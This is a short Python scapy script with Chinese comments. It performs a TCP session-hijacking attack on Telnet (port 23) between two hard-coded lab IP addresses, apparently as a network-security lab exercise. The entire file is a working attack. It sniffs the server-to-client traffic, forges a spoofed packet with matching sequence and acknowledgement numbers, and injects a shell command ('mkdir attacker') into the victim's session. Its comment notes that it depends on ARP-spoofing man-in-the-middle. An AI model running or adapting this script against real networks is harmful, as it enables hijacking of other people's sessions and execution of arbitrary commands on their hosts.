#!/usr/bin/python3
from scapy.all import *
from scapy.layers.inet import *
"""
    Internal-Attacker通过sniff嗅探，制造虚假的client->server报文，并在其中注入mkdir attacker命令
    需要结合"中间人（mitm）"ARP欺骗方法实现
"""


server = "10.10.10.190"     # FIXME: Internal-Server IP
client = "10.10.10.192"     # FIXME: Internal-Client IP
PORT = 23


def spoof(pkt):
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]
    ip = IP(src=old_ip.dst, dst=old_ip.src)
    tcp = TCP(sport=old_tcp.dport, dport=old_tcp.sport, seq=old_tcp.ack, ack=old_tcp.seq+len(old_tcp.payload), flags="A")
    # set command
    data = "\nmkdir attacker\n"
    pkt = ip / tcp / data
    send(pkt, verbose=0)
    ls(pkt)
    quit()


f = 'tcp and src host {} and dst host {} and src port {}'.format(server, client, PORT)
sniff(filter=f, prn=spoof, iface='eth0')


